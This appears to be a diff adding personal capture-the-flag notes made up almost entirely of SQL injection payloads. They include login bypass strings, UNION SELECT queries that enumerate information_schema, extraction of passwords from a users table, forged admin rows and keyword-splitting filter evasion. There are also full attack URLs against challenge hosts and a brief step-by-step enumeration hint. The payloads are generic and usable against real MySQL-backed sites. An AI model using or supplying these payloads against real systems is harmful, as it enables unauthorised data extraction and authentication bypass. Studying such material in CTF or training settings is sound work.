@@ -1,0 +1,63 @@
+1
+1' union select table_name,2 from information_schema.tables ##
+1' or ''='
+1' union select column_name,2 from information_schema.columns ##
+1' union all select password,password from users ##
+23 union select 1,2,3,4,5--+
+23 and 0 union select 1,2,3,4,5--+
+23 and false union select 1,2,3,4,5--+
+-23 union select 1,2,3,4,5--+
+-23 union select 'hello1','hello2','hello3','hello4','hello5'--+
+-23 union select 0x68656c6c6f31,0x68656c6c6f32,0x68656c6c6f33,0x68656c6c6f34,0x68656c6c6f35--+
+-23 union select 1,2,version(),4,5--+
+-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
+-23 union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' limit 3,1--+
+1' union select column_name,2 from information_schema.columns ##
+1' union select table_name,2 from information_schema.tables ##
+a' union select 1,1,1,1,1 from information_schema.tables where table_schema=database() ##
+a' union select 1,1,1,1 from information_schema.tables where table_schema=database() ##
+a' union select 1,1,1 from information_schema.tables where table_schema=database() ##
+a' union select 1,1 from information_schema.tables where table_schema=database() ##
+a' union select 1 from information_schema.tables where table_schema=database() ##
+a' union select 1,1 from users where is_admin=true ##
+a' union select 1,1,1 from users where is_admin=true ##
+a' union select 1,1,1,1 from users where is_admin==true ##
+http://yrmyzscnvh.abctf.xyz/web8/?id=1%20union%20select%20%201,1,(select%20*%20from%20w0w_y0u_f0und_m3),1
+Color: w0w_y0u_f0und_m3
+Name: 
+Breed: 
+
+http://202.120.7.203/index.php?id=1+AND+1=2+uni%0bon+se%0blect+1,1,flag%20fr%0bom%20flag
+Color: webeight
+http://yrmyzscnvh.abctf.xyz/web8/?id=1%20union%20select%20%201,(select%20*%20from%20w0w_y0u_f0und_m3),1,1
+http://yrmyzscnvh.abctf.xyz/web8/?id=3%20%20union%20select%201,1,column_name,3  from information_schema.columns where table_schema=database() and table_name='w0w_y0u_f0und_m3'
+
+
+
+
+
+
+
+
+while ($row = mysql_fetch_assoc($rows)) {echo $row['title'];  echo $row['content'];
+  
+}
+
+
+go' union  select 1 as id,1 as username,1 as password,true as is_admin ##
+go' union  select 1 as id,1 as username,1 as password,true as is_admin ##
+go' union  select 1 as id,1 as username,1 as password,true as is_admin ##
+go' union  select 1 ,1 ,1,1 ##
+go' union  select 1 ##
+go' union  select 1 ,1 ##
+go' union  select 1 ,1 ,1 ##
+
+that's one way to solve :) you can also add "LIMIT 1,1" to start the results at the 2nd row 
+nope 
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet 
+you'll get all you need to first : 
+1) find the database name 
+2) find the current table which stores the news 
+3) find other table (may be .... :p) 
+4) find relevant columns 
+5) extract data
